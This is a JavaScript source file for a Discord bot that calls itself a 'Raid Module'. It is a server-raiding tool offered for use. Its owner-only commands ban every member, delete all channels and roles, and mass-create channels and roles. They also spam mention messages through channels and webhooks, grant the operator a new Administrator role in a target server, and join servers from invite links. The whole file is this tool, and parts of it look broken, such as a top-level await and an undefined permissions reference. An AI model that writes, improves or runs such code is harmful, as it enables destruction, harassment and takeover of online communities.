const { Client, GatewayIntentBits, setActivity, Presence } = require('discord.js');
const config = require('./config.json');
const fs = require('fs')
const path = require('path')
const axios = require("axios")

/*
TODO: Add commands handler
      Support every commands
      Add more function.
      Super clean code.
*/

const client = new Client({
    intents: [ 
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ]
});

// Log Helper
const log = (message, type = 'info') => {
    const colors = { info: '\x1b[34m', success: '\x1b[32m', error: '\x1b[31m' };
    console.log(`${colors[type]}%s\x1b[0m`, message);
};

// Global state to track operations
const botState = {
    isRunning: false,
    currentOperation: null
};


// Cancellation token implementation
class CancellationToken {
    constructor() {
        this.isCancelled = false;
    }

    cancel() {
        this.isCancelled = true;
    }

    throwIfCancelled() {
        if (this.isCancelled) {
            throw new Error('Operation cancelled by user');
        }
    }
}

// Utility Functions
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const { currentVersion } = JSON.parse(fs.readFileSync(path.join(process.cwd(), "package.json"), "utf-8"))
const { latestVersion } = await axios.get("https://github.com/Mikasuru/KukuriClient/raw/refs/heads/main/package.json")

// Events
client.once('ready', async () => {
    log(`
        ██╗  ██╗██╗   ██╗██╗  ██╗██╗   ██╗██████╗ ██╗     ██████╗██╗     ██╗███████╗███╗   ██╗████████╗
        ██║ ██╔╝██║   ██║██║ ██╔╝██║   ██║██╔══██╗██║    ██╔════╝██║     ██║██╔════╝████╗  ██║╚══██╔══╝
        █████╔╝ ██║   ██║█████╔╝ ██║   ██║██████╔╝██║    ██║     ██║     ██║█████╗  ██╔██╗ ██║   ██║   
        ██╔═██╗ ██║   ██║██╔═██╗ ██║   ██║██╔══██╗██║    ██║     ██║     ██║██╔══╝  ██║╚██╗██║   ██║   
        ██║  ██╗╚██████╔╝██║  ██╗╚██████╔╝██║  ██║██║    ╚██████╗███████╗██║███████╗██║ ╚████║   ██║   
        ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
                            >> Kukuri Client | Raid Module | Version: ${await currentVersion} <<
                                -- Github: Mikasuru | Discord: intertia. --
                                   >> Logged in as ${client.user.tag} <<
                        Current Version: ${await currentVersion} | Latest Version: ${await latestVersion}
    `)
    client.user.setActivity('Managing Servers', { type: 'WATCHING' });
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.author.id != config.GeneralSettings.OwnerId) { return; }

    async function InternalBan() {
        console.log("I didn't test this yet, Feel free to tell me any recommend or bugs.")
        let Time = 2000; if (config.GeneralSettings.IgnoreCooldown == true) { Time = 750 }
        return new Promise((resolve, reject) => {
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log("Error Found: " + err) }).then(() => { console.log(`${member.user.tag} was banned.`) });
                    }
                }, Time);
            })
        })
    }

    async function InternalDeleteChannel() {
        try {
            await Promise.all(message.guild.channels.cache.map(channel => channel.delete()));
        
            const newChannel = await message.guild.channels.create({
              name: config.ChannelSettings.nameAfterDeleted,
            });
        
            console.log(`Successfully created channel: ${newChannel.name}`);
          } catch (error) {
            console.error("Error:", error);
          }
    }

    async function InternalDeleteRoles(message) {
        if (!message.guild) {
            return message.reply('This command can only be used in a server.');
        }
    
        try {
            const roles = message.guild.roles.cache.filter(role => 
                !role.managed && 
                role.editable && 
                role.position < message.guild.members.me.roles.highest.position
            );
    
            log(`Attempting to delete ${roles.size} roles...`, 'info');
            
            let deletedCount = 0;
            let failedCount = 0;
    
            for (const role of roles.values()) {
                try {
                    // Skip @everyone role
                    if (role.id === message.guild.id) continue;
                    
                    await role.delete(`Mass role deletion requested by ${message.author.tag}`);
                    log(`Deleted role: ${role.name}`, 'success');
                    deletedCount++;
                    
                    
                    if (config.GeneralSettings.IgnoreCooldown == true) {
                        await new Promise(resolve => setTimeout(resolve, 100));
                    } else {
                        await new Promise(resolve => setTimeout(resolve, 500));
                    }
                } catch (roleError) {
                    log(`Failed to delete role ${role.name}: ${roleError.message}`, 'error');
                    failedCount++;
                }
            }
    
            message.channel.send(
                `Role deletion complete:\n` +
                `✅ Successfully deleted: ${deletedCount} roles\n` +
                `❌ Failed to delete: ${failedCount} roles`
            );
    
        } catch (err) {
            log(`Error in deleteRoles: ${err.message}`, 'error');
            message.reply('An error occurred while deleting roles. Check bot permissions.');
        }
    }

    async function InternalMass(serverId, cancellationToken) {
        return new Promise(async (resolve, reject) => {
            try {
                const targetServer = client.guilds.cache.get(serverId);
                if (!targetServer) {
                    reject(new Error('Server not found'));
                    return;
                }
    
                const currentChannelCount = targetServer.channels.cache.size;
                const remainingChannels = 500 - currentChannelCount;
                
                if (remainingChannels <= 0) {
                    reject(new Error('Server has reached channel limit (500)'));
                    return;
                }
    
                const channelsToCreate = Math.min(config.ChannelSettings.channelAmount, remainingChannels);
                let createdChannels = 0;
    
                const batchSize = config.ChannelSettings.channelAmount;
                for (let i = 0; i < channelsToCreate; i += batchSize) {
                    cancellationToken.throwIfCancelled();
                    
                    const batch = [];
                    const batchEnd = Math.min(i + batchSize, channelsToCreate);
                    
                    for (let j = i; j < batchEnd; j++) {
                        batch.push(targetServer.channels.create({
                            name: config.ChannelSettings.channelName,
                            type: 0
                        }));
                    }
    
                    const channels = await Promise.all(batch);
                    createdChannels += channels.length;
    
                    const messagePromises = channels.map(async (channel) => {
                        try {
                            const messages = [];
                            for (let k = 0; k < config.ChannelSettings.mentionNumber; k++) {
                                cancellationToken.throwIfCancelled();
                                messages.push(channel.send(config.ChannelSettings.mentionMessage));
                                
                                if (config.GeneralSettings.IgnoreCooldown === false) {
                                    await sleep(2500);
                                }
                            }
                            await Promise.all(messages);
                        } catch (error) {
                            log(`Error sending messages to channel ${channel.name}: ${error.message}`, 'error');
                        }
                    });
    
                    await Promise.all(messagePromises);
                    //await sleep(1000);
                }
    
                resolve(createdChannels);
            } catch (err) {
                reject(err);
            }
        });
    }

    const args = message.content.split(/\s+/);
    const command = args.shift().toLowerCase();

    // Banall
    if (command === config.CommandSettings.commandPrefix + config.CommandSettings.BanArgs) {
        await InternalBan(message.guild);
    }
    // Delc
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.ChannelArgs) {
        await InternalDeleteChannel(message.guild);
    }
    // Delr
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.RolesArgs) {
        await InternalDeleteRoles(message);
    }
    // Modified mass command implementation
    if (command === config.CommandSettings.commandPrefix + config.CommandSettings.MassArgs) {
        if (botState.isRunning) {
            return message.reply(`An operation is already running. Use ${config.CommandSettings.commandPrefix}stop to cancel it first.`);
        }

        const serverId = args[0];
        if (!serverId) {
            return message.reply('Please provide a server ID');
        }

        // Create new cancellation token for this operation
        const cancellationToken = new CancellationToken();
        botState.currentOperation = cancellationToken;
        botState.isRunning = true;

        try {
            const createdChannels = await InternalMass(serverId, cancellationToken);
            message.reply(`Operation completed. Created ${createdChannels} channels.`);
        } catch (error) {
            if (error.message === 'Operation cancelled by user') {
                message.reply('Operation was cancelled.');
            } else {
                message.reply(`Error: ${error.message}`);
            }
        } finally {
            botState.isRunning = false;
            botState.currentOperation = null;
        }
    }
    // Admin
    if (command === config.CommandSettings.commandPrefix + config.CommandSettings.AdminArgs) {
        const serverId = args[0];
        if (!serverId) {
            return message.reply('Please enter server id');
        }

        const targetServer = client.guilds.cache.get(serverId);
        if (!targetServer) {
            return message.reply('Cannot find the provided serverID');
        }

        if (!targetServer.members.cache.get(client.user.id)) {
            return message.reply('I doesnt have the access to this server');
        }

        try {
            const adminRole = await targetServer.roles.create({
                name: 'Administrator',
                permissions: [PermissionsBitField.Flags.Administrator],
                reason: 'Automated admin role creation'
            });
            
            const targetMember = await targetServer.members.fetch(message.author.id);
            if (targetMember) {
                await targetMember.roles.add(adminRole);
                log(`Created admin role in ${targetServer.name} and assigned to ${message.author.tag}`, 'success');
                message.reply(`Gave admin at ${targetServer.name} Successfully!`);
            } else {
                await adminRole.delete();
                message.reply('Hmmz you didnt join that server');
            }
        } catch (err) {
            log(`Error in welcome command: ${err.message}`, 'error');
            message.reply('Check bot permission');
        }
    }
    // Massr
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.MassRolesArgs) {
        if (!message.guild) {
            return message.reply('This command can only be used in a server.');
        }

        try {
            log(`Creating ${config.RoleSettings.roleCreateAmount} roles...`, 'info');
            
            for (let i = 0; i < config.RoleSettings.roleCreateAmount; i++) {
                await message.guild.roles.create({
                    name: `${config.RoleSettings.roleName}`,
                    reason: 'Automated role creation'
                });
                log(`Created role: ${config.RoleSettings.roleName} #${i + 1}`, 'success');
            }
            message.reply(`Successfully created ${config.RoleSettings.roleCreateAmount} roles!`);
        } catch (err) {
            log(`Error in create roles: ${err.message}`, 'error');
            message.reply('Failed to create roles. Please check bot permissions.');
        }
    }
    // Webhook
    else if (command === config.CommandSettings.commandPrefix + config.CommandSettings.WebhookArgs) {
        const serverId = args[0];
        if (!serverId) {
            return message.reply('Please enter server id');
        }

        const targetServer = client.guilds.cache.get(serverId);
        if (!targetServer) {
            return message.reply('Cannot find the provided serverID');
        }

        if (!targetServer.members.cache.get(client.user.id)) {
            return message.reply('I doesnt have the access to this server');
        }
    
        try {
            const currentChannelCount = targetServer.channels.cache.size;
            const remainingChannels = 500 - currentChannelCount;
            
            if (remainingChannels <= 0) {
                return message.reply('This server reached the max channel limited (500)');
            }
    
            const channelsToCreate = Math.min(config.ChannelSettings.channelAmount, remainingChannels);
    
            for (let i = 0; i < channelsToCreate; i++) {
                const channel = await targetServer.channels.create({
                    name: config.ChannelSettings.channelName,
                    type: 0 // 0 is GUILD_TEXT
                });
                
                for (let j = 0; j < config.ChannelSettings.mentionNumber; j++) {
                    const webhook = await channel.createWebhook({
                        name: config.WebhookSettings.webhookName,
                        avatar: config.WebhookSettings.webhookAvatar
                    });
                    
                    await webhook.send(config.WebhookSettings.webhookMessage);
                    
                    if (config.GeneralSettings.IgnoreCooldown === true) {
                        log(`Sending webhook at ${targetServer.name} with no cooldown\nBeware rate limit`, 'info');
                    } else {
                        await sleep(2500);
                    }
                }
            }
            
            message.reply(`Created Webhook in Server ${targetServer.name} Successfully! (${channelsToCreate} Channel)`);
            
        } catch (err) {
            log(`Error in webhooks (Server: ${targetServer.name}): ${err.message}`, 'error');
            message.reply('Check bot permission.');
        }
    }
    // Stop command
    else if (command === config.CommandSettings.commandPrefix + 'stop') {
        if (!botState.isRunning) {
            return message.reply('No operations are currently running.');
        }
        
        if (botState.currentOperation) {
            botState.currentOperation.cancel();
            botState.isRunning = false;
            botState.currentOperation = null;
            message.reply('Stopping all operations...');
        }
    }
    // Invite - Join server with invite link
    if (command === config.CommandSettings.commandPrefix + config.CommandSettings.InviteArgs) {
        const inviteLink = args[0];
        if (!inviteLink) {
            return message.reply('Please provide an invite link');
        }

        try {
            let inviteCode = inviteLink;
            if (inviteLink.includes('/')) {
                inviteCode = inviteLink.split('/').pop();
            }

            const invite = await client.fetchInvite(inviteCode);
            await invite.accept();
            message.reply(`Successfully joined server: ${invite.guild.name}`);
        } catch (error) {
            log(`Error joining server: ${error.message}`, 'error');
            message.reply('Failed to join server. Please check the invite link and try again.');
        }
    }
    // Get invite - Generate invite links for current server
    if (command === config.CommandSettings.commandPrefix + config.CommandSettings.GetInviteArgs) {
        if (!message.guild) {
            return message.reply('This command can only be used in a server');
        }

        try {
            if (!message.guild.members.me.permissions.has('CreateInstantInvite')) {
                return message.reply('I don\'t have permission to create invites in this server');
            }

            const channel = message.guild.channels.cache
                .find(channel => channel.type === 0 && channel.permissionsFor(client.user).has('CreateInstantInvite'));

            if (!channel) {
                return message.reply('No suitable channel found to create invite');
            }

            const invite = await channel.createInvite({
                maxAge: 0,
                maxUses: 0,
                unique: true,
                reason: 'Requested through getinv command'
            });

            message.author.send(`**Kukuri Client**: Server invite for ${message.guild.name}: ${invite.url}`)
                .then(() => {
                    message.reply('Invite link has been sent to your DMs');
                })
                .catch(() => {
                    message.reply(`Unable to DM you. Here's the invite link: ${invite.url}`);
                });

        } catch (error) {
            log(`Error creating invite: ${error.message}`, 'error');
            message.reply('Failed to create invite link');
        }
    }

    /*
    massr
    delr
    delc
    banall
    */
});

client.login(config.token);
